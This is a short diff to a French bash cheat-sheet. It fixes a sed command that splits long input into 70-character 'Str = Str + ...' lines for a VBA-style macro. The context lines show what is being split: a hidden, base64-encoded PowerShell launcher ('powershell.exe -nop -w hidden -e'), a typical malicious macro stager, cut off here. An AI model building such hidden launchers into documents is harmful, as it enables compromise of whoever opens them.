@@ -35,7 +35,7 @@ cat test | sed -e 's/^/echo /g' | sed -e 's/$/>> file.txt/g'
 
 Découper une longue entrée sur plusieurs lignes:
 ``` bash
-cat test | | sed 's/.\{70\}/Str = Str + "&"\n/g'
+cat test | sed 's/.\{70\}/Str = Str + "&"\n/g'
 Str = Str + "%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmACg"
 Str = Str + "AWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnA"
 [...]
